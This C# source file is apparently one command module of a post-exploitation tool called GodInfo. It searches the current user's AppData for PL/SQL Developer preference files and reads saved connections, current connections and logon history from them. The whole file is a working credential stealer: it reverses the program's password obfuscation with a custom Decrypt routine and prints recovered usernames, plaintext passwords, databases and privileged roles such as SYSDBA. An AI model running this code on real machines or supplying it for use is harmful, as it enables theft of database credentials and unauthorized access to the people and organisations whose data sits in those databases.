using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Reflection;
using GodInfo.Utils;

namespace GodInfo.Commands
{
    public class PLSQLDeveloperCredCommand : ICommand
    {
        public struct ConnectionInfo
        {
            public string DisplayName;
            public string Username;
            public string Password;
            public string Database;
            public string ConnectAs;
        }

        private class Connection
        {
            public string IsFolder = "0";
            public string Number = null;
            public string Parent = "-1";
            public string Username = null;
            public string Database = null;
            public string ConnectAs = null;
            public string Edition = null;
            public string Workspace = null;
            public string AutoConnect = null;
            public string ConnectionMatch = null;
            public string Color = null;
            public string Password = null;
            public string IdentifiedExt = null;
            public string DisplayName;

            public Connection(string name)
            {
                DisplayName = name;
            }
        }

        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Cred Mode", 1);
            Logger.WriteLine("[*] Hunting passwords saved by PL/SQL Developer.");
            GetPLSQLDeveloperCred();
        }

        public static void GetPLSQLDeveloperCred()
        {
            Logger.TaskHeader("Hunting PL/SQL Developer", 1);
            
            List<string> prefsFiles = FindPrefsFiles();
            
            if (prefsFiles.Count == 0)
            {
                Logger.WriteLine("[-] No PL/SQL Developer preference files found.");
                return;
            }

            bool foundAnyCredentials = false;
            
            foreach (string prefsFile in prefsFiles)
            {
                Logger.WriteLine($"[*] Processing preference file: {prefsFile}");
                List<ConnectionInfo> connections = ParsePreferencesFile(prefsFile);
                
                if (connections.Count > 0)
                {
                    foundAnyCredentials = true;
                    Logger.WriteLine($"[+] Found {connections.Count} connection(s) in {Path.GetFileName(prefsFile)}");
                    Logger.PrintTableFromStructs(connections);
                }
            }

            if (!foundAnyCredentials)
            {
                Logger.WriteLine("[-] No PL/SQL Developer credentials found.");
            }
        }

        public static bool CheckPLSQLDeveloperCredExists()
        {
            return FindPrefsFiles().Count > 0;
        }

        private static List<string> FindPrefsFiles()
        {
            List<string> prefsFiles = new List<string>();
            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            
            try
            {
                // 方法1：直接检查所有可能的版本号和用户名组合
                string userName = Environment.UserName;
                string[] knownVersions = new string[] { "14", "13", "12", "11", "10", "9", "8", "" };
                
                foreach (string version in knownVersions)
                {
                    string versionFolder = string.IsNullOrEmpty(version) ? 
                                          "PLSQL Developer" : 
                                          $"PLSQL Developer {version}";
                    
                    string fullPath = Path.Combine(appDataPath, versionFolder, "Preferences", userName, "user.prefs");
                    
                    if (File.Exists(fullPath))
                    {
                        prefsFiles.Add(fullPath);
                    }
                }
                
                // 方法2：搜索所有包含"PLSQL"的目录
                if (prefsFiles.Count == 0)
                {
                    string[] possibleDirs = Directory.GetDirectories(appDataPath, "*PLSQL*", SearchOption.TopDirectoryOnly);
                    
                    foreach (string dir in possibleDirs)
                    {
                        string prefsDir = Path.Combine(dir, "Preferences");
                        
                        if (Directory.Exists(prefsDir))
                        {
                            string[] userDirs = Directory.GetDirectories(prefsDir);
                            
                            foreach (string userDir in userDirs)
                            {
                                string userPrefsFile = Path.Combine(userDir, "user.prefs");
                                if (File.Exists(userPrefsFile))
                                {
                                    prefsFiles.Add(userPrefsFile);
                                }
                            }
                        }
                    }
                }
                
           
            }
            catch (Exception)
            {
                // 忽略异常
            }
            
            return prefsFiles;
        }

        private static List<ConnectionInfo> ParsePreferencesFile(string path)
        {
            List<ConnectionInfo> result = new List<ConnectionInfo>();
            List<Connection> connections = new List<Connection>();
            List<string> currentConnectionStrings = new List<string>();
            List<string> logonHistoryStrings = new List<string>();
            
            string currentBlock = null;
            Connection currentConnection = null;

            try
            {
                using (StreamReader prefs = new StreamReader(path))
                {
                    string line;
                    while ((line = prefs.ReadLine()) != null)
                    {
                        line = line.Trim();
                        if (line.Length < 1)
                        {
                            continue;
                        }
                        else if (line[0] == '[')
                        {
                            // 新块开始
                            if (currentConnection != null)
                            {
                                connections.Add(currentConnection);
                                currentConnection = null;
                            }
                            string newBlock = line.Substring(1, line.Length - 2);
                            currentBlock = newBlock;
                        }
                        else if (currentBlock == "Connections")
                        {
                            string[] parts = line.Split(new[] { '=' }, 2);
                            for (int i = 0; i < parts.Length; i++)
                            {
                                parts[i] = parts[i].Trim();
                            }

                            if (parts[0] == "DisplayName")
                            {
                                // 新连接
                                if (currentConnection != null)
                                {
                                    connections.Add(currentConnection);
                                }
                                currentConnection = new Connection(parts[1]);
                            }
                            else if (parts.Length > 1 && currentConnection != null)
                            {
                                try
                                {
                                    var field = typeof(Connection).GetField(parts[0]);
                                    if (field != null)
                                    {
                                        field.SetValue(currentConnection, parts[1]);
                                    }
                                }
                                catch
                                {
                                    // 忽略不存在的字段
                                }
                            }
                        }
                        else if (currentBlock == "CurrentConnections")
                        {
                            currentConnectionStrings.Add(line);
                        }
                        else if (currentBlock == "LogonHistory")
                        {
                            logonHistoryStrings.Add(line);
                        }
                    }
                }
                
                if (currentConnection != null)
                {
                    connections.Add(currentConnection);
                }

                // 处理保存的连接
                foreach (Connection con in connections)
                {
                    if (con.Password != null && con.IsFolder != "1")
                    {
                        string decryptedPassword = Decrypt(con.Password);
                        if (!string.IsNullOrEmpty(decryptedPassword))
                        {
                            result.Add(new ConnectionInfo
                            {
                                DisplayName = con.DisplayName,
                                Username = con.Username,
                                Password = decryptedPassword,
                                Database = con.Database,
                                ConnectAs = con.ConnectAs
                            });
                        }
                    }
                }

                // 处理当前连接
                foreach (string line in currentConnectionStrings)
                {
                    string decrypted = Decrypt(line);
                    if (!string.IsNullOrEmpty(decrypted))
                    {
                        string[] parts = decrypted.Split(',');
                        if (parts.Length >= 3)
                        {
                            result.Add(new ConnectionInfo
                            {
                                DisplayName = "CurrentConnection",
                                Username = parts[0],
                                Password = parts[1],
                                Database = parts[2],
                                ConnectAs = parts.Length > 3 ? parts[3] : ""
                            });
                        }
                    }
                }

                // 处理登录历史
                foreach (string line in logonHistoryStrings)
                {
                    string decrypted = Decrypt(line);
                    if (!string.IsNullOrEmpty(decrypted))
                    {
                        // 支持多种格式的登录历史解析
                        if (decrypted.Contains("@"))
                        {
                            // 尝试解析完整连接字符串格式: username/password@database
                            string username = "";
                            string password = "";
                            string database = "";
                            string connectAs = "";
                            
                            int usernameEndIndex = decrypted.IndexOf('/');
                            if (usernameEndIndex > 0)
                            {
                                username = decrypted.Substring(0, usernameEndIndex);
                                int databaseStartIndex = decrypted.IndexOf('@');
                                
                                if (databaseStartIndex > usernameEndIndex)
                                {
                                    password = decrypted.Substring(usernameEndIndex + 1, databaseStartIndex - usernameEndIndex - 1);
                                    
                                    // 检查是否有"as SYSDBA"等连接方式
                                    int asIndex = decrypted.IndexOf(" as ", databaseStartIndex, StringComparison.OrdinalIgnoreCase);
                                    if (asIndex > 0)
                                    {
                                        database = decrypted.Substring(databaseStartIndex + 1, asIndex - databaseStartIndex - 1);
                                        connectAs = decrypted.Substring(asIndex + 1).Trim();
                                    }
                                    else
                                    {
                                        database = decrypted.Substring(databaseStartIndex + 1);
                                    }
                                    
                                    result.Add(new ConnectionInfo
                                    {
                                        DisplayName = "LogonHistory",
                                        Username = username,
                                        Password = password,
                                        Database = database,
                                        ConnectAs = connectAs
                                    });
                                }
                            }
                        }
                        else
                        {
                            // 尝试使用逗号分隔的格式解析
                            string[] parts = decrypted.Split(',');
                            if (parts.Length >= 3)
                            {
                                result.Add(new ConnectionInfo
                                {
                                    DisplayName = "LogonHistory",
                                    Username = parts[0],
                                    Password = parts[1],
                                    Database = parts[2],
                                    ConnectAs = parts.Length > 3 ? parts[3] : ""
                                });
                            }
                        }
                    }
                }
            }
            catch (Exception)
            {
                // 忽略异常
            }

            return result;
        }

        private static string Decrypt(string encrypted)
        {
            try
            {
                if (string.IsNullOrEmpty(encrypted) || encrypted.Length < 4)
                {
                    return null;
                }
                
                // 确保所有字符都是数字
                foreach (char c in encrypted)
                {
                    if (!char.IsDigit(c))
                    {
                        return null;
                    }
                }
                
                List<int> parts = new List<int>();
                for (int i = 0; i < encrypted.Length; i += 4)
                {
                    if (i + 4 <= encrypted.Length)
                    {
                        string chunk = encrypted.Substring(i, 4);
                        int value = int.Parse(chunk);
                        parts.Add(value);
                    }
                }

                if (parts.Count < 2)  // 至少需要一个密钥和一个字符
                {
                    return null;
                }

                int key = parts[0];
                parts.RemoveAt(0);

                StringBuilder decrypted = new StringBuilder();
                for (int i = 0; i < parts.Count; i++)
                {
                    int n = parts[i];
                    int mask = (n - 1000) ^ (key + (i + 1) * 10);
                    char c = (char)(mask >> 4);
                    decrypted.Append(c);
                }

                string result = decrypted.ToString();
                return result;
            }
            catch (Exception)
            {
                return null;
            }
        }
    }
} 